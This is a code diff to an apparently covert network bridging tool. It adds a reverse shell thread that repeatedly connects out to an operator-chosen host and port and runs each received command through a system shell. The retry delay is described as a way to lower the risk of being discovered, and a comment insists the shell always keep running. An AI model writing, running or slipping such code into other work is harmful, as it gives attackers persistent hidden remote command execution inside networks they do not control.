@@ -27,17 +27,97 @@ def cmd(c):
 
 # Signal handler class for Ctrl-c
 class SignalHandler():
-    def __init__(self, decoder, bridge, netfilter):
+    def __init__(self, shell, decoder, bridge, netfilter):
+        self.shell = shell
         self.decoder = decoder
         self.bridge = bridge
         self.netfilter = netfilter
         signal.signal(signal.SIGINT, self.signal_handler)
 
     def signal_handler(self, signal, frame):
+        if self.shell:
+            self.shell.stop()
         self.decoder.stop()
         self.bridge.destroy()
         self.netfilter.reset()
         sys.exit(0)
+
+    @staticmethod
+    def threadSleep(sec, thread):
+        for _ in range(sec):
+            if thread.running:  # Stop sleeping when thread stops
+                time.sleep(1)
+
+
+class ReverseShell(Thread):
+    running = False
+    sock = None
+    ip = None
+    port = None
+    password = None
+    sleep = None
+
+    def __init__(self, host, password, sleep):
+        Thread.__init__(self)
+
+        self.ip, self.port = host.split(':')
+        self.password = password
+        self.sleep = sleep
+
+    def run(self):
+        self.running = True
+        try:
+            while self.running:
+                try:
+                    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    self.sock.connect((self.ip, int(self.port)))
+                except:
+                    SignalHandler.threadSleep(int(self.sleep), self)
+                    continue
+
+                if self.password:
+                    self.sock.sendall('Password: ')
+                    data = self.sock.recv(1024)
+                    if data != (self.password + "\n"):
+                        self.closeCon()
+                        continue
+
+                self.sock.sendall("""\
+***************************************************
+* Welcome to the reverse shell!                   *
+* This is not bash! Think before you type!        *
+* Don't run any long running tasks.               *
+* Instead set up an ssh tunnel or something else. *
+***************************************************\n\n""")
+                self.sock.sendall("$ ")
+                while 1:
+                    data = self.sock.recv(1024)
+                    if not data:
+                        break
+
+                    try:
+                        r = subprocess.check_output(data, shell=True)
+                    except:
+                        r = ""
+
+                    self.sock.sendall(r)
+                    self.sock.sendall("$ ")
+
+                self.closeCon()
+        except:
+            pass  # Always keep the reverse shell running!
+
+    def stop(self):
+        self.running = False
+        self.closeCon()
+        time.sleep(0.1)
+
+    def closeCon(self):
+        try:
+            self.sock.shutdown(socket.SHUT_RDWR)
+        except socket.error:
+            pass
+        self.sock.close()
 
 
 class DecoderThread(Thread):
@@ -430,13 +510,18 @@ def main():
     bridge = Bridge("mibr", args.ifaces, subnet)
     netfilter = Netfilter(subnet, bridge)
     arptable = ArpTable()
+    shell = None
+    if args.rev_host:
+        shell = ReverseShell(args.rev_host, args.rev_password, args.rev_sleep)
 
     bridge.up()
     decoder = DecoderThread(bridge, subnet, arptable)
 
-    sig = SignalHandler(decoder, bridge, netfilter)
+    sig = SignalHandler(shell, decoder, bridge, netfilter)
 
     decoder.start()
+    if args.rev_host:
+        shell.start()
 
     print "Listening on %s: net=%s, mask=%s, linktype=%d" % \
           (bridge.bridgename, decoder.pcap.getnet(), decoder.pcap.getmask(), decoder.pcap.datalink())
@@ -479,6 +564,21 @@ if __name__ == '__main__':
                              "<rPORT> is the remote port you will connect to "
                              "from the network. The service needs to listen "
                              "on 169.254.66.77 or <any>.")
+    parser.add_argument('-r', '--rev-host', default=None,
+                        metavar="<HOST>:<PORT>",
+                        help="Enable the reverse connect shell and set the "
+                             "host and port where it should connect to.\n"
+                             "On your remote machine use netcat, ncat, socat "
+                             "or something else to listen on the specified "
+                             "port.")
+    parser.add_argument('-p', '--rev-password', default=None,
+                        help="Specify a password for the reverse shell to "
+                             "prevent unauthorized access.")
+    parser.add_argument('-s', '--rev-sleep', default=30,
+                        help="Specifiy a sleep time the reverse shell should "
+                             "sleep between connect retries. This is useful "
+                             "to prevent massive connection tries and thereby "
+                             "decrease the risk of being discovered.")
     parser.add_argument('ifaces', metavar='IFACE', nargs='*',
                         default=['eth1', 'eth2'], help='Two interfaces')
     args = parser.parse_args()
